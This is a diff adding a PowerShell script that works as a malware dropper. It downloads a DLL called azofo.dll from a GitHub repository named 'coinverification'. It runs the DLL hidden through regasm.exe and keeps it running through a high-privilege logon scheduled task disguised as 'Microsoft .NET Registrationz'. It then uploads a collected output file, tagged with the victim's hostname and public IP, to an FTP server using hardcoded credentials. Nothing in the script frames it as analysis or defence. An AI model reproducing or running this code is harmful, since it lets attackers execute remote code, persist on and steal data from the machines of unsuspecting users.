@@ -1,0 +1,45 @@
+# Download DLL
+Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/azofo.dll' -OutFile 'C:\Users\Public\azofo.dll'
+
+# Wait until the file exists
+while (!(Test-Path "C:\Users\Public\azofo.dll")) { Start-Sleep -Milliseconds 500 }
+
+# Create wrapper script to avoid /tr length limit
+$scriptContent = @"
+Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\Users\Public\azofo.dll' -WindowStyle Hidden -Verb RunAs
+"@
+$scriptPath = "C:\ProgramData\regasm_runner.ps1"
+$scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII -Force
+
+# Register scheduled task
+schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
+
+# Run it immediately
+schtasks /run /tn "Microsoft .NET Registrationz"
+
+# Wait for output.html to be created (e.g., by regasm payload)
+$outputPath = "C:\Users\Public\output.html"
+while (!(Test-Path $outputPath)) { Start-Sleep -Milliseconds 500 }
+
+# Collect public IP and machine name
+$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text").Trim()
+$hostname = $env:COMPUTERNAME
+$ftpFilename = "$hostname-$publicIP.html"
+
+# FTP Credentials
+$ftpServer = "ftp://ftpupload.net/htdocs/$ftpFilename"
+$ftpUsername = "b14_39115531"
+$ftpPassword = "@Falcon2025@"
+
+# Upload output.html to FTP
+$ftpRequest = [System.Net.FtpWebRequest]::Create($ftpServer)
+$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+$ftpRequest.UseBinary = $true
+$ftpRequest.UsePassive = $true
+$ftpRequest.KeepAlive = $false
+
+$fileContent = [System.IO.File]::ReadAllBytes($outputPath)
+$ftpStream = $ftpRequest.GetRequestStream()
+$ftpStream.Write($fileContent, 0, $fileContent.Length)
+$ftpStream.Close()
